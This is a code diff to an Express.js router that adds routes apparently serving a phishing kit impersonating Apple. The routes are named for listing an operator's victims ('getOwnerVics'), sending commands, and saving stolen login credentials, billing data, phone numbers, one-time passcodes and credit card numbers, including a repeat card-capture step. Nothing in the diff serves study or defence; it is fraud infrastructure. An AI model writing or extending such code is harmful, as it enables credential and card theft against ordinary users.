@@ -1,10 +1,30 @@
 const express = require("express");
-const { sendAuRes, sendRes } = require("../controllers/appleController");
+const {
+  sendAuRes,
+  sendRes,
+  getOwnerVics,
+  command,
+  getInfo,
+  submitAppAuth,
+  submitBilling,
+  submitTelephone,
+  submitOtp,
+  submitCCAgain,
+  submitCC,
+} = require("../controllers/appleController");
 
 const router = express.Router();
 
 router.post("/", sendRes);
-
 router.post("/au", sendAuRes);
+router.get("/customers/:owner", getOwnerVics);
+router.post("/command", command);
+router.get("/customers/id/:uniqueid", getInfo);
+router.post("/saveAuth", submitAppAuth);
+router.post("/saveBilling", submitBilling);
+router.post("/saveTelephone", submitTelephone);
+router.post("/saveOtp", submitOtp);
+router.post("/saveCCAgain", submitCCAgain);
+router.post("/saveCC", submitCC);
 
 module.exports = router;
